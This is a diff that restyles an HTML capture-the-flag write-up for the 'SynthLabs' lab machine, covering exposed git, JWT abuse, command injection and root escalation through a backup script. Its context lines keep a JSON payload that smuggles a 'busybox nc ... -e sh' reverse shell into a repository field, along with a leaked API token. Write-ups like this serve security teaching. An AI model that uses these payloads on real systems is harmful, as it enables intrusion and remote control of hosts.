@@ -15,34 +15,24 @@
 
         <main>
             <article class="content">
-                <h1>[HackingClub] SynthLabs Writeup</h1>
-                
-                <div class="box-info">
-                    <table>
-                        <tr>
-                            <td>Platform:</td>
-                            <td>HackingClub</td>
-                        </tr>
-                        <tr>
-                            <td>Machine:</td>
-                            <td>SynthLabs</td>
-                        </tr>
-                        <tr>
-                            <td>Category:</td>
-                            <td>Web Exploitation</td>
-                        </tr>
-                        <tr>
-                            <td>OS:</td>
-                            <td>Linux</td>
-                        </tr>
-                        <tr>
-                            <td>Difficulty:</td>
-                            <td><span class="difficulty medium">Medium</span></td>
-                        </tr>
-                    </table>
+                <a class="back-link" href="../hackingclub.html">← hackingclub</a>
+
+                <div class="article-head">
+                    <span class="badge badge-hc">HC</span>
+                    <span class="diff diff-medium">medium</span>
+                    <span class="article-cat">· linux / web</span>
                 </div>
 
-                <div class="tags" style="margin-bottom: 30px;">
+                <h1>SynthLabs</h1>
+
+                <div class="info-grid">
+                    <div class="info-cell"><span class="info-label">platform</span><span class="info-val">HackingClub</span></div>
+                    <div class="info-cell"><span class="info-label">machine</span><span class="info-val">SynthLabs</span></div>
+                    <div class="info-cell"><span class="info-label">category</span><span class="info-val">Web</span></div>
+                    <div class="info-cell"><span class="info-label">os</span><span class="info-val">Linux</span></div>
+                </div>
+
+                <div class="tags">
                     <span class="tag">git exposed</span>
                     <span class="tag">jwt</span>
                     <span class="tag">command injection</span>
@@ -51,7 +41,7 @@
 
                 <img src="../../images/hackingclub/synthlabs/index.png" alt="SynthLabs Machine" style="max-width: 100%; margin-bottom: 20px;">
 
-                <h2>## Recon</h2>
+                <h2>Recon</h2>
                 
                 <p>At the beginning, I used <code>nmap</code> with the following parameters to scan the target.</p>
 
@@ -88,7 +78,7 @@ PORT=3000
 DOJO_URL=http://localhost:8080
 TOKEN_DOJO=28f538e6b2f27e342e494e5fd7e837246aa7f19b</code></pre>
 
-                <h2>## Exploitation</h2>
+                <h2>Exploitation</h2>
                 
                 <p>We can observe that there is an API and a DefectDojo instance, but they are not directly accessible to us. So, the first step is to understand the web application.</p>
 
@@ -132,7 +122,7 @@ Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
 
 {"repository":"t\nbusybox nc 10.0.10.235 4444 -e sh\nsleep(13)"}</code></pre>
 
-                <h2>## Post Exploitation</h2>
+                <h2>Post Exploitation</h2>
                 
                 <p>By inspecting the processes with <code>pspy</code>, we see that the root user (UID 0) is running the <code>backup.sh</code> script. If we modify this file, we can perform privilege escalation.</p>
 
@@ -204,9 +194,6 @@ uid=33(www-data) gid=33(www-data) euid=0(root) groups=33(www-data)</code></pre>
                 </div>
             </article>
 
-            <div style="margin-top: 30px; padding-top: 20px; border-top: 1px dashed var(--text-dim);">
-                <a href="../../writeups.html">&lt;&lt; Back to Writeups</a>
-            </div>
         </main>
 
         <div data-component="footer" data-base-path="../../"></div>
